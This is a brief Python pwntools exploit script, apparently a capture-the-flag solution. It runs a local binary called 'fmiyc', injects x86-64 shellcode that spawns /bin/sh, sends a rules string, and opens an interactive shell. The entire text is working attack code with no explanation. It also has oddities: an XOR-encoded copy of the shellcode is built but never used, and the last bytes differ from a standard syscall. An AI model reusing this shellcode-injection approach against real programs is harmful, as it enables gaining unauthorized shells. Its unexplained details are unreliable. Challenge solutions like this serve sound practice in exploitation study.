from pwn import *

shellcode = "\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x63"
rules = 'R08S99-05L99C02'

if __name__ == "__main__":

	p = process( "./fmiyc" )
	# gdb.attach( p, '''
	# 	b *run_code_with_rules+734
	# 	continue
	# 	'''
	# )

	res = ''
	
	for i in shellcode:
		res += chr( ord( i ) ^ 0x7f )

	p.send( shellcode + '\n' )
	p.recv( 4 )
	p.send( rules + '\n' )
	
	p.interactive()